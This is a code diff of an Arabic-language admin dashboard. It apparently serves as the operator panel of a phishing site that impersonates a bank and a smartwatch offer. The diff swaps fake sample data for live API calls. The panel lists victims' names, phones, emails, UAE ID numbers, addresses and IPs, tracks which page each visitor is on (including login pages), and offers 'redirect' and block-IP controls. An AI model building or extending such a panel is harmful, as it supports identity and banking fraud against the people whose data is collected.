@@ -67,9 +67,9 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .stat-card.pages .stat-value { color: #fbbf24; }
 
 .wifi-pulse { display: inline-flex; align-items: center; gap: 10px; }
-.wifi-pulse .pulse-dot {
+.pulse-dot {
   width: 10px; height: 10px; background: #00c8ff; border-radius: 50%;
-  animation: pulse 1.5s ease-in-out infinite;
+  animation: pulse 1.5s ease-in-out infinite; display: inline-block;
 }
 @keyframes pulse {
   0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0,200,255,0.4); }
@@ -82,7 +82,6 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .tab-content { display: none; }
 .tab-content.active { display: block; }
 
-/* Orders Table */
 .orders-table {
   width: 100%; background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
   border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
@@ -91,8 +90,7 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .orders-table table { width: 100%; border-collapse: collapse; }
 .orders-table th {
   text-align: right; padding: 16px 14px; font-size: 0.78rem; color: #6b7f9e;
-  font-weight: 600; letter-spacing: 0.3px;
-  background: rgba(0,0,0,0.15); border-bottom: 1px solid rgba(255,255,255,0.06);
+  font-weight: 600; background: rgba(0,0,0,0.15); border-bottom: 1px solid rgba(255,255,255,0.06);
 }
 .orders-table td { padding: 13px 14px; font-size: 0.88rem; border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle; }
 .orders-table tr:last-child td { border-bottom: none; }
@@ -114,7 +112,6 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .btn-redirect { background: rgba(139,92,246,0.15); color: #a78bfa; }
 .btn-redirect:hover { background: rgba(139,92,246,0.25); }
 
-/* Modal */
 .modal-overlay {
   display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
   z-index: 100; justify-content: center; align-items: center; padding: 20px;
@@ -156,7 +153,6 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .btn-block { background: rgba(156,163,175,0.2); color: #f87171; border: 1px solid rgba(248,113,113,0.3); }
 .btn-block:hover { background: rgba(248,113,113,0.2); }
 
-/* Visitors Table */
 .visitors-table {
   width: 100%; background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
   border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
@@ -174,21 +170,7 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .status-dot.online { background: #34d399; box-shadow: 0 0 6px rgba(52,211,153,0.5); }
 .page-badge { background: rgba(0,200,255,0.1); color: #00c8ff; padding: 4px 12px; border-radius: 8px; font-size: 0.8rem; }
 
-/* Chart */
-.chart-card {
-  background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
-  border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
-  padding: 24px; margin-bottom: 30px;
-}
-.chart-bars { display: flex; align-items: flex-end; gap: 8px; height: 160px; padding-top: 20px; }
-.chart-bar {
-  flex: 1; background: linear-gradient(180deg, #00c8ff 0%, #0060cc 100%);
-  border-radius: 6px 6px 0 0; min-width: 20px;
-  animation: barGrow 1s ease-out forwards; transform-origin: bottom;
-}
-@keyframes barGrow { from { transform: scaleY(0); } to { transform: scaleY(1); } }
-.chart-labels { display: flex; gap: 8px; margin-top: 10px; }
-.chart-labels span { flex: 1; text-align: center; font-size: 0.7rem; color: #6b7f9e; }
+.empty-msg { text-align: center; color: #6b7f9e; padding: 50px 20px; font-size: 0.95rem; }
 
 @media (max-width: 1100px) {
   .orders-table { overflow-x: auto; }
@@ -232,14 +214,9 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
       الزوار
     </a>
-    <a onclick="showTab('settings')" id="nav-settings">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9c.38.35 1.51 1 1.51 1H21a2 2 0 0 1 0 4h-.09c-.5.04-1.14.62-1.51 1z"/></svg>
-      الإعدادات
-    </a>
   </nav>
 </aside>
 
-<!-- Modal -->
 <div class="modal-overlay" id="detailsModal">
   <div class="modal">
     <button class="modal-close" onclick="closeModal()">&times;</button>
@@ -278,33 +255,25 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
             <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="#00c8ff"/>
           </svg>
         </div>
-        <div class="stat-label"><span class="wifi-pulse"><span class="pulse-dot"></span> الزوار النشطون الآن</span></div>
+        <div class="stat-label"><span class="wifi-pulse"><span class="pulse-dot"></span> الزوار النشطون</span></div>
         <div class="stat-value" id="activeCount">0</div>
-        <div class="stat-change up">متصل مباشرة</div>
+        <div class="stat-change up">مباشر</div>
       </div>
       <div class="stat-card total-visits">
         <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></div>
         <div class="stat-label">إجمالي الزيارات اليوم</div>
         <div class="stat-value" id="totalVisits">0</div>
-        <div class="stat-change up">+12% من أمس</div>
       </div>
       <div class="stat-card orders">
         <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 0 1-8 0"/></svg></div>
-        <div class="stat-label">الطلبات الجديدة</div>
-        <div class="stat-value" id="newOrders">0</div>
-        <div class="stat-change up">هذا الأسبوع</div>
+        <div class="stat-label">إجمالي الطلبات</div>
+        <div class="stat-value" id="totalOrders">0</div>
       </div>
       <div class="stat-card pages">
         <div class="stat-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/></svg></div>
         <div class="stat-label">الصفحات المعروضة</div>
         <div class="stat-value" id="pageViews">0</div>
-        <div class="stat-change up">+8% من أمس</div>
       </div>
-    </div>
-    <div class="chart-card">
-      <div class="section-title">نشاط الزوار - آخر 12 ساعة</div>
-      <div class="chart-bars" id="chartBars"></div>
-      <div class="chart-labels" id="chartLabels"></div>
     </div>
   </div>
 
@@ -333,7 +302,9 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
             <th>الإجراءات</th>
           </tr>
         </thead>
-        <tbody id="ordersBody"></tbody>
+        <tbody id="ordersBody">
+          <tr><td colspan="7" class="empty-msg">لا توجد طلبات حتى الآن</td></tr>
+        </tbody>
       </table>
     </div>
   </div>
@@ -343,164 +314,160 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
     <div class="section-title">الزوار المتصلون حالياً <span class="badge" id="onlineBadge">0 متصل</span></div>
     <div class="visitors-table">
       <table>
-        <thead><tr><th>الحالة</th><th>الدولة</th><th>الصفحة الحالية</th><th>الجهاز</th><th>مدة الجلسة</th></tr></thead>
-        <tbody id="visitorsBody"></tbody>
+        <thead><tr><th>الحالة</th><th>IP</th><th>الصفحة الحالية</th><th>الجهاز</th></tr></thead>
+        <tbody id="visitorsBody">
+          <tr><td colspan="4" class="empty-msg">لا يوجد زوار نشطون</td></tr>
+        </tbody>
       </table>
-    </div>
-  </div>
-
-  <!-- Settings Tab -->
-  <div class="tab-content" id="tab-settings">
-    <div class="section-title">الإعدادات</div>
-    <div class="chart-card">
-      <p style="color:#6b7f9e; text-align:center; padding:40px 0;">قريباً...</p>
     </div>
   </div>
 </div>
 
 <script>
-var countries = ['الإمارات','السعودية','الكويت','البحرين','قطر','عمان','مصر','الأردن'];
-var serviceTypes = ['طلب ساعة ذكية','فتح حساب جديد','تفعيل بطاقة','طلب قرض شخصي','تحويل دولي'];
-var firstNames = ['أحمد','محمد','فاطمة','عبدالله','سارة','خالد','نورة','عمر','ليلى','يوسف','مريم','حسن','هند','علي','دانة'];
-var lastNames = ['المنصوري','الحربي','الشامسي','النعيمي','الكتبي','العلي','المهيري','الظاهري','السويدي','الفلاسي'];
-var emails = ['gmail.com','hotmail.com','yahoo.com','outlook.com'];
-var emiratesArr = ['أبوظبي','دبي','الشارقة','عجمان','أم القيوين','رأس الخيمة','الفجيرة'];
-var devices = ['iPhone','Android','Desktop','iPad','Samsung Galaxy','Huawei'];
-var sitePages = [{name:'الرئيسية',path:'/ar/'},{name:'الساعات',path:'/ar/mbankapp/'},{name:'نموذج الطلب',path:'/ar/order/'},{name:'تسجيل الدخول',path:'/ar/login/'},{name:'Home EN',path:'/en/'},{name:'Watches',path:'/en/mbankapp/'},{name:'Order',path:'/en/order/'},{name:'Login',path:'/en/login/'}];
-
-function rand(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
-function randIP(){return rand(1,255)+'.'+rand(0,255)+'.'+rand(0,255)+'.'+rand(1,254);}
-function formatTime(m){return m<60?m+' دقيقة':Math.floor(m/60)+' ساعة '+(m%60)+' د';}
-
 var ordersData = [];
-var currentOrderIdx = -1;
+var currentOrderId = -1;
 
-for(var i=0;i<rand(8,18);i++){
-  var fn=firstNames[rand(0,firstNames.length-1)], ln=lastNames[rand(0,lastNames.length-1)];
-  ordersData.push({
-    id: 1001+i,
-    country: countries[rand(0,countries.length-1)],
-    service: serviceTypes[rand(0,serviceTypes.length-1)],
-    name: fn+' '+ln,
-    phone: '05'+rand(10000000,99999999),
-    email: fn.toLowerCase()+'@'+emails[rand(0,emails.length-1)],
-    idNumber: '784-'+rand(1900,2005)+'-'+rand(1000000,9999999)+'-'+rand(1,9),
-    emirate: emiratesArr[rand(0,emiratesArr.length-1)],
-    address: 'شارع '+rand(1,50)+', بناية '+rand(1,200)+', شقة '+rand(1,30),
-    ip: randIP(),
-    status: 'pending',
-    date: '2026-10-'+rand(8,12)+' '+rand(8,23)+':'+('0'+rand(0,59)).slice(-2)
-  });
-}
-
-function showTab(tab){
-  document.querySelectorAll('.tab-content').forEach(function(t){t.classList.remove('active');});
-  document.querySelectorAll('.sidebar-nav a').forEach(function(a){a.classList.remove('active');});
-  document.getElementById('tab-'+tab).classList.add('active');
-  document.getElementById('nav-'+tab).classList.add('active');
-  var titles = {dashboard:'لوحة التحكم',orders:'قائمة الطلبات',visitors:'الزوار',settings:'الإعدادات'};
+function showTab(tab) {
+  document.querySelectorAll('.tab-content').forEach(function(t) { t.classList.remove('active'); });
+  document.querySelectorAll('.sidebar-nav a').forEach(function(a) { a.classList.remove('active'); });
+  document.getElementById('tab-' + tab).classList.add('active');
+  document.getElementById('nav-' + tab).classList.add('active');
+  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار' };
   document.getElementById('pageTitle').textContent = titles[tab];
+  if (tab === 'orders') loadOrders();
+  if (tab === 'visitors') loadVisitors();
 }
 
-function renderOrders(){
-  var tb=document.getElementById('ordersBody');
-  tb.innerHTML='';
-  document.getElementById('ordersBadge').textContent=ordersData.length+' طلب';
-  ordersData.forEach(function(o,idx){
-    var statusClass = o.status==='approved'?'approved':o.status==='rejected'?'rejected':o.status==='blocked'?'blocked':'pending';
-    var statusText = o.status==='approved'?'مقبول':o.status==='rejected'?'مرفوض':o.status==='blocked'?'محظور':'قيد المراجعة';
-    var tr=document.createElement('tr');
-    tr.innerHTML='<td>'+o.id+'</td><td>'+o.country+'</td><td>'+o.service+'</td><td>'+o.name+'</td><td dir="ltr" style="text-align:right">'+o.phone+'</td><td><span class="status-badge '+statusClass+'">'+statusText+'</span></td><td><button class="btn-sm btn-details" onclick="openDetails('+idx+')">التفاصيل</button><button class="btn-sm btn-redirect" onclick="redirectOrder('+idx+')">إعادة التوجيه</button></td>';
+function loadStats() {
+  fetch('/api/stats').then(function(r) { return r.json(); }).then(function(d) {
+    document.getElementById('activeCount').textContent = d.activeVisitors;
+    document.getElementById('activeCountOrders').textContent = d.activeVisitors;
+    document.getElementById('totalVisits').textContent = d.totalVisitsToday;
+    document.getElementById('totalOrders').textContent = d.totalOrders;
+    document.getElementById('pageViews').textContent = d.pageViewsToday;
+    document.getElementById('onlineBadge').textContent = d.activeVisitors + ' متصل';
+  }).catch(function() {});
+}
+
+function loadOrders() {
+  fetch('/api/orders').then(function(r) { return r.json(); }).then(function(d) {
+    ordersData = d.orders || [];
+    renderOrders();
+  }).catch(function() {});
+}
+
+function loadVisitors() {
+  fetch('/api/visitors').then(function(r) { return r.json(); }).then(function(d) {
+    var vb = document.getElementById('visitorsBody');
+    var list = d.visitors || [];
+    document.getElementById('onlineBadge').textContent = list.length + ' متصل';
+    if (list.length === 0) {
+      vb.innerHTML = '<tr><td colspan="4" class="empty-msg">لا يوجد زوار نشطون</td></tr>';
+      return;
+    }
+    vb.innerHTML = '';
+    list.forEach(function(v) {
+      var device = 'غير معروف';
+      var ua = v.ua || '';
+      if (ua.indexOf('iPhone') > -1) device = 'iPhone';
+      else if (ua.indexOf('Android') > -1) device = 'Android';
+      else if (ua.indexOf('iPad') > -1) device = 'iPad';
+      else if (ua.indexOf('Windows') > -1) device = 'Desktop';
+      else if (ua.indexOf('Mac') > -1) device = 'Mac';
+      var tr = document.createElement('tr');
+      tr.innerHTML = '<td><span class="status-dot online"></span> متصل</td><td dir="ltr" style="text-align:right">' + v.ip + '</td><td><span class="page-badge">' + v.page + '</span></td><td>' + device + '</td>';
+      vb.appendChild(tr);
+    });
+  }).catch(function() {});
+}
+
+function renderOrders() {
+  var tb = document.getElementById('ordersBody');
+  document.getElementById('ordersBadge').textContent = ordersData.length + ' طلب';
+  if (ordersData.length === 0) {
+    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد طلبات حتى الآن</td></tr>';
+    return;
+  }
+  tb.innerHTML = '';
+  ordersData.forEach(function(o) {
+    var sc = o.status === 'approved' ? 'approved' : o.status === 'rejected' ? 'rejected' : o.status === 'blocked' ? 'blocked' : 'pending';
+    var st = o.status === 'approved' ? 'مقبول' : o.status === 'rejected' ? 'مرفوض' : o.status === 'blocked' ? 'محظور' : 'قيد المراجعة';
+    var tr = document.createElement('tr');
+    tr.innerHTML = '<td>' + o.id + '</td><td>' + (o.country || '-') + '</td><td>' + (o.service || '-') + '</td><td>' + o.name + '</td><td dir="ltr" style="text-align:right">' + o.phone + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td><button class="btn-sm btn-details" onclick="openDetails(' + o.id + ')">التفاصيل</button><button class="btn-sm btn-redirect" onclick="redirectOrder(' + o.id + ')">إعادة التوجيه</button></td>';
     tb.appendChild(tr);
   });
 }
 
-function openDetails(idx){
-  currentOrderIdx=idx;
-  var o=ordersData[idx];
-  var html='';
-  var fields=[
-    ['رقم الطلب',o.id],['التاريخ',o.date],['الاسم الكامل',o.name],
-    ['رقم الجوال',o.phone],['البريد الإلكتروني',o.email],['رقم الهوية',o.idNumber],
-    ['الدولة',o.country],['الإمارة',o.emirate],['عنوان التوصيل',o.address],
-    ['نوع الخدمة',o.service],['عنوان IP',o.ip],
-    ['الحالة','<span class="status-badge '+(o.status==='approved'?'approved':o.status==='rejected'?'rejected':o.status==='blocked'?'blocked':'pending')+'">'+(o.status==='approved'?'مقبول':o.status==='rejected'?'مرفوض':o.status==='blocked'?'محظور':'قيد المراجعة')+'</span>']
+function openDetails(id) {
+  currentOrderId = id;
+  var o = ordersData.find(function(x) { return x.id === id; });
+  if (!o) return;
+  var dt = o.date ? new Date(o.date).toLocaleString('ar-AE') : '-';
+  var sc = o.status === 'approved' ? 'approved' : o.status === 'rejected' ? 'rejected' : o.status === 'blocked' ? 'blocked' : 'pending';
+  var st = o.status === 'approved' ? 'مقبول' : o.status === 'rejected' ? 'مرفوض' : o.status === 'blocked' ? 'محظور' : 'قيد المراجعة';
+  var fields = [
+    ['رقم الطلب', o.id], ['التاريخ', dt], ['الاسم الكامل', o.name],
+    ['رقم الجوال', o.phone], ['البريد الإلكتروني', o.email || '-'], ['رقم الهوية', o.id_number || '-'],
+    ['الدولة', o.country || '-'], ['الإمارة', o.emirate || '-'], ['عنوان التوصيل', o.address || '-'],
+    ['نوع الخدمة', o.service || '-'], ['عنوان IP', o.ip || '-'],
+    ['الحالة', '<span class="status-badge ' + sc + '">' + st + '</span>']
   ];
-  fields.forEach(function(f){
-    html+='<div class="modal-row"><span class="label">'+f[0]+'</span><span class="value">'+f[1]+'</span></div>';
+  var html = '';
+  fields.forEach(function(f) {
+    html += '<div class="modal-row"><span class="label">' + f[0] + '</span><span class="value">' + f[1] + '</span></div>';
   });
-  document.getElementById('modalData').innerHTML=html;
+  document.getElementById('modalData').innerHTML = html;
   document.getElementById('detailsModal').classList.add('show');
 }
 
-function closeModal(){
+function closeModal() {
   document.getElementById('detailsModal').classList.remove('show');
 }
 
-function actionOrder(action){
-  if(currentOrderIdx<0)return;
-  ordersData[currentOrderIdx].status=action;
-  renderOrders();
-  closeModal();
-  var msg=action==='approved'?'تم قبول الطلب بنجاح':'تم رفض الطلب';
-  alert(msg);
+function actionOrder(action) {
+  if (currentOrderId < 0) return;
+  fetch('/api/orders/status', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ id: currentOrderId, status: action })
+  }).then(function() {
+    closeModal();
+    loadOrders();
+  });
 }
 
-function blockIP(){
-  if(currentOrderIdx<0)return;
-  var ip=ordersData[currentOrderIdx].ip;
-  ordersData[currentOrderIdx].status='blocked';
-  renderOrders();
-  closeModal();
-  alert('تم حظر IP: '+ip);
+function blockIP() {
+  if (currentOrderId < 0) return;
+  var o = ordersData.find(function(x) { return x.id === currentOrderId; });
+  if (!o) return;
+  fetch('/api/block-ip', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ ip: o.ip })
+  }).then(function() {
+    closeModal();
+    loadOrders();
+  });
 }
 
-function redirectOrder(idx){
-  var o=ordersData[idx];
-  alert('إعادة توجيه الطلب #'+o.id+' - '+o.name);
+function redirectOrder(id) {
+  var o = ordersData.find(function(x) { return x.id === id; });
+  if (o) alert('إعادة توجيه الطلب #' + o.id + ' - ' + o.name);
 }
 
 // Init
-var activeVisitors=rand(3,12), totalVisits=rand(120,350), newOrd=rand(5,25), pv=rand(400,900);
+var now = new Date();
+var months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
+var days = ['الأحد','الإثنين','الثلاثاء','الأربعاء','الخميس','الجمعة','السبت'];
+document.getElementById('currentDate').textContent = days[now.getDay()] + ' ' + now.getDate() + ' ' + months[now.getMonth()] + ' ' + now.getFullYear();
 
-function animNum(el,t,d){var s=null;function step(ts){if(!s)s=ts;var p=Math.min((ts-s)/d,1);el.textContent=Math.floor(p*t);if(p<1)requestAnimationFrame(step);}requestAnimationFrame(step);}
-animNum(document.getElementById('activeCount'),activeVisitors,1000);
-animNum(document.getElementById('activeCountOrders'),activeVisitors,1000);
-animNum(document.getElementById('totalVisits'),totalVisits,1500);
-animNum(document.getElementById('newOrders'),newOrd,1200);
-animNum(document.getElementById('pageViews'),pv,1800);
-document.getElementById('onlineBadge').textContent=activeVisitors+' متصل';
+loadStats();
+loadOrders();
 
-var now=new Date();
-var months=['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
-var days=['الأحد','الإثنين','الثلاثاء','الأربعاء','الخميس','الجمعة','السبت'];
-document.getElementById('currentDate').textContent=days[now.getDay()]+' '+now.getDate()+' '+months[now.getMonth()]+' '+now.getFullYear();
+setInterval(loadStats, 3000);
 
-var vb=document.getElementById('visitorsBody');
-for(var v=0;v<activeVisitors;v++){
-  var tr=document.createElement('tr');
-  tr.innerHTML='<td><span class="status-dot online"></span> متصل</td><td>'+countries[rand(0,countries.length-1)]+'</td><td><span class="page-badge">'+sitePages[rand(0,sitePages.length-1)].name+'</span></td><td>'+devices[rand(0,devices.length-1)]+'</td><td>'+formatTime(rand(1,45))+'</td>';
-  vb.appendChild(tr);
-}
-
-var cb=document.getElementById('chartBars'),cl=document.getElementById('chartLabels'),ch=now.getHours();
-for(var h=11;h>=0;h--){
-  var hr=(ch-h+24)%24,val=rand(10,100);
-  var bar=document.createElement('div');bar.className='chart-bar';bar.style.height=val+'%';bar.style.animationDelay=(11-h)*0.05+'s';cb.appendChild(bar);
-  var lb=document.createElement('span');lb.textContent=(hr<10?'0':'')+hr+':00';cl.appendChild(lb);
-}
-
-renderOrders();
-
-setInterval(function(){
-  activeVisitors=Math.max(1,activeVisitors+rand(-1,2));
-  document.getElementById('activeCount').textContent=activeVisitors;
-  document.getElementById('activeCountOrders').textContent=activeVisitors;
-  document.getElementById('onlineBadge').textContent=activeVisitors+' متصل';
-},5000);
-
-document.getElementById('detailsModal').addEventListener('click',function(e){
-  if(e.target===this)closeModal();
+document.getElementById('detailsModal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
 });
 </script>
 </body>
